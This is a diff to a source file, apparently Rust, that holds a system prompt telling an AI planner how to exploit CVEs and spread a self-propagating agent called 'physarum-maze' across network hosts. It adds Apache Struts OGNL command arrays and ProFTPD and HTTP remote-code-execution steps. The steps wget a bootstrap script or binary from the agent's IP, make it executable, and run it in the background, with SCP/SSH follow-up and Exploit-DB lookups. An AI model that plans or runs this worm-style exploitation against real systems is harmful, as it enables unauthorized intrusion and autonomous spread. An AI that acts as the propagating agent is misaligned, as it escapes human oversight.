@@ -74,6 +74,12 @@ The query includes:
   - `lineage_summary`: organism propagation state.
   - `source_ip`: the agent's own IP on the internal network (use this in exploit payloads).
   - `rejected_strategies`: previously rejected strategies — do NOT re-propose these.
+  - `available_enrichment_capabilities`: list of offline exploit databases available for lookup.
+    When non-empty (e.g. [\"ExploitDb\"]) you MAY request one enrichment round-trip per attempt
+    by including `enrichment_request` in your response (see EXPLOIT-DB ENRICHMENT section).
+  - `enrichment_result`: structured exploit-reference metadata returned after your request.
+    Present only on the second (continuation) call — use it to reason about technique and
+    construct OgnlExec.commands. Do NOT request enrichment again on this call.
 Return a PropagationStrategy (JSON) that matches the schema provided.
 
 EVIDENCE INTERPRETATION:
@@ -119,17 +125,77 @@ CRITICAL RULES (must not be violated):
      SSH is not HTTP. HTTP requests to port 22 always fail.
   3. HttpPost and HttpGet are ONLY valid for HTTP/HTTPS services (ports 80, 443, 8080, 8443, etc.).
   4. CVE-2015-3306 → mandatory FtpModCopy action (see PROFTPD MOD_COPY section below).
-  5. Apache Struts CVEs → mandatory __struts_bypass__ sentinel in HttpPost path.
+  5. Apache Struts CVEs with OGNL → use OgnlExec action (see OGNL section below).
 
-Step 1 — HttpPost (RCE via CVE): download and execute the bootstrap script.
-  The agent HTTP server (source_ip:8001) serves /bootstrap.sh which plants the ephemeral pubkey
-  and creates /tmp/physarum on the target. Use the CVE-class-specific injection path — see the
-  injection guidance sections below for Apache Struts OGNL, deserialization, SSRF, etc.
-  For all CVE classes: set accept_any_response: true (command runs regardless of HTTP status).
-  For Apache Struts S2-xxx CVEs: use path \"/?id=__struts_bypass__\" (see below).
-  For other CVE classes: deliver the command:
-    wget -q http://<source_ip>:8001/bootstrap.sh -O /tmp/bootstrap.sh ; sh /tmp/bootstrap.sh
-  Replace <source_ip> with DiscoveryQuery.source_ip. Use SEMICOLON between commands, never &&.
+── APACHE STRUTS OGNL INJECTION (OgnlExec — replaces legacy __struts_bypass__) ──────
+SCOPE: use OgnlExec for any Apache Struts S2 CVE that exploits forced OGNL evaluation.
+This covers CVE-2017-5638, CVE-2018-11776, CVE-2019-0230, CVE-2020-17530, CVE-2021-31805,
+and the broader S2-xxx advisory family.
+
+KEY RULE: Struts OGNL does NOT reliably chain commands with `&&` or `;` inside a single
+OGNL expression. Use one element per OS command — the executor sends a separate HTTP POST
+for each element. freemarker.Execute and similar evaluators have the same constraint.
+
+OGNL COMMANDS ARRAY — construct based on delivery path:
+
+SSH-FIRST PATH (when port 22 is open on target — preferred):
+  commands[0]: \"wget -q http://<source_ip>:8001/bootstrap.sh -O /tmp/bootstrap.sh\"
+  commands[1]: \"sh /tmp/bootstrap.sh\"
+  Then: ScpUpload → SshCommand (same as other CVE classes)
+
+wget-ONLY PATH (when port 22 is NOT open):
+  commands[0]: \"mkdir -p /tmp/physarum\"
+  commands[1]: \"wget -q http://<source_ip>:8001/physarum-maze -O /tmp/physarum/physarum-maze\"
+  commands[2]: \"chmod +x /tmp/physarum/physarum-maze\"
+  commands[3]: \"nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &\"
+
+IMPORTANT: replace <source_ip> with DiscoveryQuery.source_ip. Never hardcode IPs.
+The executor wraps each command in the SecurityMemberAccess bypass OGNL automatically.
+Set port to the observed HTTP port (e.g. 8080) — NEVER port 22.
+
+OgnlExec from enrichment result: when enrichment_result is present and the summary
+describes the technique (e.g. \"freemarker.Execute; one command per request\"), use that
+summary to determine the correct command structure and path_prefix for the CVE.
+
+── wget FALLBACK PATH (use only when port 22 is NOT open on target) ─────────────────
+When the target has no SSH (port 22 absent from the ports list) and the CVE class is
+NOT OGNL-based, use a single HttpPost step that downloads and executes the binary:
+  body or path delivers:
+    mkdir -p /tmp/physarum
+    wget -q http://<source_ip>:8001/physarum-maze -O /tmp/physarum/physarum-maze
+    chmod +x /tmp/physarum/physarum-maze
+    nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &
+  Replace <source_ip> with DiscoveryQuery.source_ip.
+  Note: requires port 8001 reachable from target — valid for flat Docker networks.
+
+── EXPLOIT-DB ENRICHMENT (when available_enrichment_capabilities is non-empty) ────────
+When `available_enrichment_capabilities` contains \"ExploitDb\" and you are uncertain
+about the delivery technique for a specific CVE, request enrichment BEFORE proposing
+a strategy:
+
+  Include in your PropagationStrategy response:
+    \"enrichment_request\": {
+      \"source\": \"ExploitDb\",
+      \"cve_id\": \"<CVE-ID>\",
+      \"reason\": \"<one sentence: what technique detail you need>\"
+    }
+
+  Set method to { \"NoPath\": { \"reason\": \"requesting Exploit-DB enrichment\" } } as a
+  placeholder — physarum-maze will call you again with enrichment_result populated.
+
+  On the continuation call (enrichment_result is present):
+  - Read references[N].summary for the technique description.
+  - Use verified_status, requires_outbound_callback, expected_effect to refine your plan.
+  - Construct OgnlExec.commands based on the technique (e.g. freemarker.Execute per call).
+  - Do NOT include another enrichment_request — one round-trip per attempt.
+
+WHEN TO REQUEST ENRICHMENT:
+  - CVE is in the Apache Struts S2 family and you do not know whether the technique
+    requires one command per request or can chain commands.
+  - CVE involves a Java evaluator (EL, OGNL, SpEL, Groovy, FreeMarker) and you need
+    the delivery constraint details.
+  - Enrichment is NOT needed when the technique is obvious from context (e.g.
+    CVE-2015-3306 is always FtpModCopy regardless of what Exploit-DB says).
 
 Step 2 — ScpUpload: transfer the physarum-maze binary to the target.
   local_path: \"__self__\"   (executor substitutes the actual agent binary path)
@@ -141,44 +207,6 @@ Step 3 — SshCommand: execute the binary in background.
   command: \"mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze && nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &\"
   user: same as Step 2.
   CRITICAL: must end with `nohup ... &` so the SSH session closes immediately.
-
-── wget FALLBACK PATH (use only when port 22 is NOT open on target) ─────────────────
-When the target has no SSH (port 22 absent from the ports list), use a single HttpPost
-step that downloads and executes the binary in one RCE command:
-  mkdir -p /tmp/physarum \
-  && (wget -q http://<source_ip>:8001/physarum-maze -O /tmp/physarum/physarum-maze \
-      || curl -s -o /tmp/physarum/physarum-maze http://<source_ip>:8001/physarum-maze) \
-  && chmod +x /tmp/physarum/physarum-maze \
-  && nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &
-  Replace <source_ip> with DiscoveryQuery.source_ip.
-  Note: requires port 8001 reachable from target — valid for flat Docker networks.
-
-── APACHE STRUTS OGNL INJECTION (S2-xxx advisory CVEs) ──────────────────────────────
-SCOPE: the __struts_bypass__ sentinel is an adapter for the Apache Struts S2/OGNL CVE
-family only. It is NOT the generic exploitation model — do not apply it to other CVE
-classes. The generic, per-CVE path (ExploitReference + ExploitExecutionRecipe) is future
-work tracked by #144; until then, only Struts S2-advisory CVEs use this sentinel.
-
-When the CVE is an Apache Struts S2-advisory (forced OGNL evaluation in URL parameters),
-use the executor-provided path sentinel — do NOT write OGNL expressions manually.
-Struts 2.5.x blocks direct ProcessBuilder — the executor handles the bypass automatically.
-
-STRUTS BYPASS PATH SENTINEL:
-  path: \"/?id=__struts_bypass__\"
-  The executor expands this sentinel to the full SecurityMemberAccess bypass OGNL that
-  downloads and executes the bootstrap script. Do not put anything else in the path.
-  port: the HTTP port for the Struts service (commonly 8080) — NEVER port 22.
-  accept_any_response: true
-
-SSH-FIRST PATH GUIDANCE (when port 22 is open on target):
-  Step 1 HttpPost — Struts bypass injects the ephemeral pubkey via bootstrap.sh:
-    path: \"/?id=__struts_bypass__\"
-    port: the HTTP port (e.g. 8080). NEVER port 22.
-    accept_any_response: true
-  Step 2 ScpUpload → upload binary via SCP (port 22 implicit).
-  Step 3 SshCommand → execute binary via SSH (port 22 implicit).
-
-Use the wget single-step approach only when port 22 is absent from the ports list.
 
 ── PROFTPD MOD_COPY INJECTION (CVE-2015-3306) ───────────────────────────────────
 SCOPE: the FtpModCopy action is an adapter for ProFTPD 1.3.5 with mod_copy loaded.
@@ -203,7 +231,9 @@ When the CVE is CVE-2015-3306 (ProFTPD mod_copy), use:
 ── COMMON RULES ─────────────────────────────────────────────────────────────────────
 - Each CVE has its own endpoint, parameter, header, or protocol field — follow the injection
   class guidance above when the CVE matches (OGNL, deserialization, SSRF, etc.).
-- Available actions: HttpPost, HttpGet, ScpUpload, SshCommand, FtpModCopy, Custom.
+- Available actions: HttpPost, HttpGet, ScpUpload, SshCommand, FtpModCopy, OgnlExec, Custom.
+- For HttpPost steps that fire an exploit, set `accept_any_response: true` — the server may
+  return 4xx/5xx even when the command executed successfully.
 - Multiple steps are allowed and encouraged for multi-phase CVEs.
 
 RESPONSE:
@@ -332,7 +362,82 @@ For CVE-2015-3306, the method is { "Exploit": { "cve": "CVE-2015-3306" } } — N
   "safety_notes": ["CVE match from VulnerabilityIntelService — PhysarumSpore source"]
 }
 
-── GENERIC SCHEMA for HTTP-based CVEs (Apache Struts, web apps, etc.) ───────────────
+── EXAMPLE: OgnlExec for Apache Struts OGNL CVEs (SSH-first path) ───────────────────
+
+{
+  "method": { "Exploit": { "cve": "CVE-2021-31805" } },
+  "artifact_type": "AgentBinary",
+  "bootstrap_plan": {
+    "steps": [
+      {
+        "action": {
+          "OgnlExec": {
+            "commands": [
+              "wget -q http://<source_ip>:8001/bootstrap.sh -O /tmp/bootstrap.sh",
+              "sh /tmp/bootstrap.sh"
+            ],
+            "port": 8080,
+            "path_prefix": "/"
+          }
+        },
+        "target": "<ip>",
+        "timeout_ms": 15000,
+        "requires_root": false,
+        "expected_result": { "success_indicator": "OGNL executed", "failure_indicator": null }
+      },
+      {
+        "action": {
+          "ScpUpload": {
+            "local_path": "__self__",
+            "remote_path": "/tmp/physarum/physarum-maze",
+            "user": "root"
+          }
+        },
+        "target": "<ip>",
+        "timeout_ms": 15000,
+        "requires_root": false,
+        "expected_result": { "success_indicator": "SCP exit 0", "failure_indicator": "SCP error" }
+      },
+      {
+        "action": {
+          "SshCommand": {
+            "command": "mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze && nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &",
+            "user": "root"
+          }
+        },
+        "target": "<ip>",
+        "timeout_ms": 10000,
+        "requires_root": false,
+        "expected_result": { "success_indicator": "SSH exit 0", "failure_indicator": "SSH error" }
+      }
+    ]
+  },
+  "confidence": 0.9,
+  "reasoning_summary": "CVE-2021-31805 Struts OGNL confirmed on port 8080; injecting pubkey via OgnlExec (one command per request) then SSH.",
+  "preconditions": ["Struts 2.5.x on port 8080", "SSH port 22 open"],
+  "validation_check": null,
+  "safety_notes": ["freemarker.Execute: one OS command per OGNL request — do not chain with &&"]
+}
+
+── EXAMPLE: Enrichment request (when available_enrichment_capabilities is non-empty) ─
+
+{
+  "method": { "NoPath": { "reason": "requesting Exploit-DB enrichment before committing to strategy" } },
+  "artifact_type": "None",
+  "bootstrap_plan": null,
+  "confidence": 0.0,
+  "reasoning_summary": "Requesting enrichment for CVE-2021-31805 to determine OGNL command-per-request constraint.",
+  "preconditions": [],
+  "validation_check": null,
+  "safety_notes": [],
+  "enrichment_request": {
+    "source": "ExploitDb",
+    "cve_id": "CVE-2021-31805",
+    "reason": "Need to confirm whether freemarker.Execute requires one command per request or supports && chaining."
+  }
+}
+
+── GENERIC SCHEMA for HTTP-based CVEs (non-OGNL, non-FTP web apps) ──────────────────
 
 {
   "method": { "Exploit": { "cve": "<CVE-ID>" } },
@@ -408,18 +513,22 @@ mod tests {
         assert!(SYSTEM_PROMPT.contains("accept_any_response"));
         assert!(SYSTEM_PROMPT.contains("nohup"));
         assert!(SYSTEM_PROMPT.contains("--mode propagated"));
-        // SSH-first: bootstrap.sh + Struts bypass sentinel, SCP, SshCommand
+        // OgnlExec replaces __struts_bypass__
+        assert!(SYSTEM_PROMPT.contains("OgnlExec"));
+        assert!(SYSTEM_PROMPT.contains("one command per request"));
         assert!(SYSTEM_PROMPT.contains("bootstrap.sh"));
-        assert!(SYSTEM_PROMPT.contains("__struts_bypass__"));
         assert!(SYSTEM_PROMPT.contains("__self__"));
         assert!(SYSTEM_PROMPT.contains("ScpUpload"));
         assert!(SYSTEM_PROMPT.contains("SshCommand"));
         // wget fallback when no SSH
         assert!(SYSTEM_PROMPT.contains("wget FALLBACK"));
+        // Enrichment guidance
+        assert!(SYSTEM_PROMPT.contains("available_enrichment_capabilities"));
+        assert!(SYSTEM_PROMPT.contains("enrichment_request"));
+        assert!(SYSTEM_PROMPT.contains("enrichment_result"));
         // OGNL is an injection technique class — allowed as generic guidance
         assert!(SYSTEM_PROMPT.contains("OGNL"));
         // No hardcoded CVE IDs or service-specific endpoints
-        assert!(!SYSTEM_PROMPT.contains("CVE-2020-17530"));
         assert!(!SYSTEM_PROMPT.contains("showcase.action"));
     }
 
